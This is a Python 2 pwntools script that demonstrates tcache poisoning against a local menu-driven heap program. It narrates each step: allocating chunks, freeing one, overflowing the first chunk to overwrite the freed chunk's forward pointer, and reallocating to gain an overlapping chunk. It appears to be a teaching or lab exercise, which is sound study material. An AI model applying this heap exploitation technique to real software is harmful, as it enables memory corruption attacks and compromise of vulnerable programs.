#!/usr/bin/env python2
from pwn import *
import re

host = '127.0.0.1'
port = 1234
conn = remote(host,port)
data = conn.recv()
print ""
print "Tcache poisoning"
print ""

print "1 . ask for 0x20 bytes (chunk 1)"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
fc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % fc_addr
print ""
fc_addr =int(fc_addr,16)

print "2. ask for 0x20 more bytes (chunk 2)"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
sc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % sc_addr
print ""
sc_addr =int(sc_addr,16)

print "3. chunk 2 is freed"
print ""
conn.send("2\n")
sleep(0.1)
data = conn.recv()
conn.send("2\n")
sleep(0.1)
data = conn.recv()

print "4. overflow first chunk to set at chunk 2 fd our target, chunk 1 header"
print ""
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(p64(0x0) * 4 + p64(0x31) + p64(0x31) + p64(fc_addr-0x10))
sleep(0.1)
data = conn.recv()

print "5. Malloc our fake size to reallocate chunk 2"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
ra_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s " % ra_addr
print ""


print "6. Malloc a new chunk of fake size. It will point to our target, chunk 1 header"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
ra_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s " % ra_addr
print ""

print "7. Overwrite chunk 2 to exit clean"
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send(p64(0x31) + p64(0x31) + "GoOogOGo")
sleep(0.1)
data = conn.recv()

raw_input ("press any key")
conn.send("8\n")
